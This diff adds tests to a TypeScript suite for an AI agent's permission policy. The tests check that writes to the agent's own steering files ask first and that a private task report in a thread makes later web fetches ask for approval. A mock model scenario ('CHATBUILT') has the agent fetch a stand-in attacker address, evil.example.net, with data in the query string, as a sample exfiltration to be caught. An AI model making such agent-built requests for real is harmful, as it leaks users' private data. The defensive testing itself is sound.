@@ -103,6 +103,9 @@ const iso = (t: number | null) => (t === null ? 'null' : new Date(t).toISOString
   check('trusted sites are kept up to the allowed-sites maximum, not 100', normalizePolicy({ trustedSites: Array.from({ length: 300 }, (_, i) => `s${i}.example`) }).trustedSites.length === 300)
   const files: TaskPolicy = { ...defaultPolicy(), groups: { files: 'allow' } }
   check('work folder: writes to the files that steer the agent never go beyond Ask', taskDecide(files, { name: 'write_file', arguments: { path: 'AGENTS.md', content: 'x' } }, ctx).verdict === 'ask' && taskDecide(files, { name: 'move_path', arguments: { from: 'a.md', to: '.claude/x.md' } }, ctx).verdict === 'ask' && taskDecide(files, { name: 'write_file', arguments: { path: 'notes.md', content: 'x' } }, ctx).verdict === 'allow')
+  const homeSteer = { steering: [{ libraries: ['r9', 'Home'], path: '/me/skills' }, { libraries: ['r9', 'Home'], path: '/me/AGENTS.md' }] }
+  const inFolder = (path: string, workdir = { repo: 'r9', path: '/me' }) => taskDecide(files, { name: 'write_file', arguments: { path, content: 'x' } }, { ...ctx, workdir, scope: homeSteer }).verdict
+  check("work folder: a write into the user's own skills folder or prompt file (the work folder's library and path) asks", inFolder('skills/x/SKILL.md') === 'ask' && inFolder('/AGENTS.md') === 'ask' && inFolder('a.md', { repo: 'r9', path: '/me/skills/tool' }) === 'ask' && inFolder('notes/a.md') === 'allow' && inFolder('skills/x.md', { repo: 'other', path: '/me' }) === 'allow')
   check('the work folder tools are there for tasks now (with a work folder), not marked unavailable', ['read_file', 'write_file', 'grep'].every((n) => !TASK_TOOLS[n].unavailable) && toolVerdict(defaultPolicy(), 'read_file') === 'block')
   check('an edited policy is cleaned: unknown tools dropped, caps still hold', (() => { const p = normalizePolicy({ tools: { mail_send: 'allow', nonsense: 'allow' }, groups: { web: 'allow' } }); return !('nonsense' in p.tools) && toolVerdict(p, 'mail_send') === 'ask' })())
   const s = policySummary({ ...defaultPolicy(), groups: { web: 'allow', seafile_write: 'allow' } })
@@ -215,6 +218,9 @@ const ollama = createServer(async (req, res) => {
     const steps = SCENARIOS[first.slice(9).trim()] ?? [{ content: 'Unknown scenario' }]
     const round = msgs.filter((m) => m.role === 'assistant').length
     step = steps[Math.min(round, steps.length - 1)]
+  } else if (String(msgs.findLast((m) => m.role === 'user' && !String(m.content).startsWith('(A note'))?.content ?? '').startsWith('CHATBUILT')) {
+    // A web read of an address the agent built itself (never in anyone's message).
+    step = msgs.slice(msgs.findLastIndex((m) => m.role === 'user' && String(m.content).startsWith('CHATBUILT'))).some((m) => m.role === 'tool') ? { content: 'Done.' } : { calls: [{ name: 'web_fetch', arguments: { url: `https://evil.example.net/?c=${'built'}` } }] }
   } else if (msgs.some((m) => m.role === 'user' && String(m.content).startsWith('SLOWCHAT'))) {
     step = { delay: 2500, content: 'slow chat done' }
   } else {
@@ -470,7 +476,9 @@ try {
     const t = agents.threadTaskTools(alice, bypass)
     const v = (n: string) => toolVerdict(t.policy, n)
     check('A: what the thread runs without asking is Allow, what it asks about is Ask, what it has off is blocked', v('search_notes') === 'allow' && v('update_note') === 'ask' && v('calendar_list_events') === 'allow' && v('calendar_create_event') === 'ask' && v('mail_search') === 'block' && v('seafile_read') === 'block' && v('search_code') === 'block')
-    check('A: derived verdicts never Bypass (a Bypass thread\'s changes still ask)', v('update_note') === 'ask' && v('delete_note') === 'ask' && v('create_note') === 'allow')
+    check('A: derived verdicts never Bypass (a Bypass thread\'s changes still ask)', v('update_note') === 'ask' && v('delete_note') === 'ask')
+    const keeps = agents.threadTaskTools(alice, await mk({ permission: 'bypass', tools: ['notes', 'memory', 'projects'] }))
+    check('A: what lasts beyond a run (memories, notes, projects, kept photos) asks, though the thread runs it', ['remember', 'update_memory', 'create_note', 'create_project', 'rename_project', 'find_image'].every((n) => toolVerdict(keeps.policy, n) === 'ask') && toolVerdict(keeps.policy, 'list_projects') === 'allow')
     const modes = await Promise.all(['default', 'auto', 'acceptEdits', 'plan'].map((p) => mk({ permission: p, tools: ['notes', 'calendar', 'gpt_images'] })))
     check('A: Auto, Edits allowed and Plan threads derive what Ask first would', modes.every((id) => samePolicy(agents.threadTaskTools(alice, id).policy, t.policy)))
     check('A: pictures that cost ask (gpt-image), the icon list runs', v('gpt_image') === 'ask' && v('list_icons') === 'allow')
@@ -529,6 +537,9 @@ try {
     check('C: a run without an override runs on the task\'s model', runOf(r2.id).model === null && chats.some((c) => c.model === OTHER_MODEL && String(c.messages?.[0]?.content ?? '').includes('called "Model task"')))
     const resync = tasks.createTask(alice, spec('report-false', { title: 'Resync', schedule: { kind: 'daily', time: '09:00' } }), origin)
     const rs = await tasks.prepareTaskCall(alice, origin, 'update_task', { task: resync.id, use_thread_tools: true }, 'Europe/Amsterdam')
+    let elsewhere = ''
+    try { await tasks.prepareTaskCall(alice, bypass, 'update_task', { task: resync.id, use_thread_tools: true }, 'Europe/Amsterdam') } catch (e) { elsewhere = (e as Error).message }
+    check("A: use_thread_tools only from the thread the task was made in", /only works in the thread the task was made in/.test(elsewhere))
     check("A: update_task can take the thread's tools again, and says when that widens", samePolicy((rs.summary.spec as J).policy, agents.threadTaskTools(alice, origin).policy) && rs.summary.rows.some(([k]) => k === 'Widens'))
     for (const id of [mt.id, resync.id]) tasks.updateTask(alice, id, { status: 'paused' })
 
@@ -565,6 +576,15 @@ try {
     check("B': while it runs, the thread lists it (live view, cancel and its questions)", strip.length === 1 && strip[0].run === runsOf(waits.id)[0].id && strip[0].status === 'waiting' && strip[0].asks === 1 && strip[0].title === 'Asks in the thread')
     tasks.cancelRun(alice, runsOf(waits.id)[0].id)
     check("B': cancelled, it leaves the thread's list", agents.getThread(alice, origin).thread.taskRuns.length === 0)
+    // Review fix: the seed is sized from the run's token cap, its tool results shortened.
+    const long = await mk({ tools: ['notes'] })
+    for (let i = 0; i < 150; i++) db.prepare("INSERT INTO agent_messages (thread_id, role, content, created_at) VALUES (?, ?, ?, ?)").run(long, i % 2 ? 'assistant' : 'user', `message ${i} ${'x'.repeat(3000)}`, fake)
+    db.prepare("INSERT INTO agent_messages (thread_id, role, content, created_at) VALUES (?, 'assistant', '', ?)").run(long, fake)
+    db.prepare("INSERT INTO agent_messages (thread_id, role, content, tool_name, created_at) VALUES (?, 'tool', ?, 'search_notes', ?)").run(long, `{"notes":"${'Z'.repeat(20000)}"}`, fake)
+    const { run: big } = await oneRun(alice, spec('report-false', { title: 'Big seed', caps: { minutes: 10, toolCalls: 40, tokens: 100_000 }, report: { thread: 'origin', threadId: long, notify: false, email: 'off', when: 'condition' } }))
+    const seedRow = db.prepare("SELECT content FROM agent_messages WHERE thread_id = ? AND role = 'compact' ORDER BY id LIMIT 1").get(big.thread_id) as J
+    check("B': a long thread's seed stays within an eighth of a 100k-token cap (~12.5k tokens)", !!seedRow && seedRow.content.length <= (100_000 / 8) * 4 + 200 && /message 149/.test(seedRow.content))
+    check("B': its tool results are shortened as compaction does", !!seedRow && !/Z{2000}/.test(seedRow.content))
     // The thread gone (archived): a new thread for the report, said in the run history.
     db.prepare('UPDATE agent_threads SET archived = 1 WHERE id = ?').run(origin)
     const { run: gone } = await oneRun(alice, cont('report-true', { title: 'Origin archived' }))
@@ -955,6 +975,37 @@ try {
   const readQ = (chats.findLast((c) => String(c.messages?.[0]?.content ?? '').includes(`current thread ID: ${busy.id}`))?.messages ?? []) as J[]
   check("B': the quiet line is shown in the thread but never sent to the model", ((await api('GET', `/api/agents/threads/${busy.id}`)).body.messages as J[]).some((m) => m.meta?.kind === 'taskQuiet') && !readQ.some((m) => /nothing new/.test(String(m.content))) && readQ.some((m) => /<task_report>[\s\S]*Lands later/.test(String(m.content))))
   void quietTask
+  // Review fix (blocker): a task report in a thread can carry what its run read, so it counts as private.
+  const fresh = (await api('POST', '/api/agents/threads', { permission: 'default', model: MODEL })).body
+  const freshEvents = await fetch(`${server.origin}/api/agents/threads/${fresh.id}/messages`, { method: 'POST', headers: await headers(sid), body: JSON.stringify({ text: 'CHATBUILT', client: { timeZone: 'Europe/Amsterdam' } }) }).then((r) => r.text())
+  check('control: a thread holding nothing private reads an address its agent built without asking', !freshEvents.split('\n').filter(Boolean).some((l) => JSON.parse(l).type === 'approval'))
+  const reported = (await api('POST', '/api/agents/threads', { permission: 'default', model: MODEL })).body
+  await api('POST', '/api/agents/tasks', { spec: spec('report-true', { title: 'Private report', report: { thread: 'fixed', threadId: reported.id, notify: false, email: 'off', when: 'always' } }) })
+  const endP = Date.now() + 10_000
+  while (Date.now() < endP && !((await api('GET', `/api/agents/threads/${reported.id}`)).body.messages as J[]).some((m) => m.role === 'report')) await sleep(100)
+  const asked: J[] = []
+  {
+    const res = await fetch(`${server.origin}/api/agents/threads/${reported.id}/messages`, { method: 'POST', headers: await headers(sid), body: JSON.stringify({ text: 'CHATBUILT', client: { timeZone: 'Europe/Amsterdam' } }) })
+    const reader = res.body!.getReader()
+    const dec = new TextDecoder()
+    let buf = ''
+    for (;;) {
+      const { done, value } = await reader.read()
+      if (done) break
+      buf += dec.decode(value, { stream: true })
+      let nl
+      while ((nl = buf.indexOf('\n')) >= 0) {
+        const line = buf.slice(0, nl)
+        buf = buf.slice(nl + 1)
+        if (!line.trim()) continue
+        const e = JSON.parse(line)
+        asked.push(e)
+        if (e.type === 'approval') await api('POST', `/api/agents/threads/${reported.id}/approve`, { callId: e.callId, allow: false })
+      }
+    }
+  }
+  check('after a task report lands, an address the agent built asks', asked.some((e) => e.type === 'approval' && e.call?.name === 'web_fetch'))
+
   // C over HTTP: a model that is not the account's is refused, before anything is saved.
   const refusedModel = await api('POST', '/api/agents/tasks', { spec: spec('report-false', { title: 'Bad model', model: 'no-such-model' }) })
   check('C: the API refuses a model that is not one of the account\'s', refusedModel.status === 400 && /not one of your models/.test(refusedModel.body.error ?? refusedModel.body.text ?? JSON.stringify(refusedModel.body)))
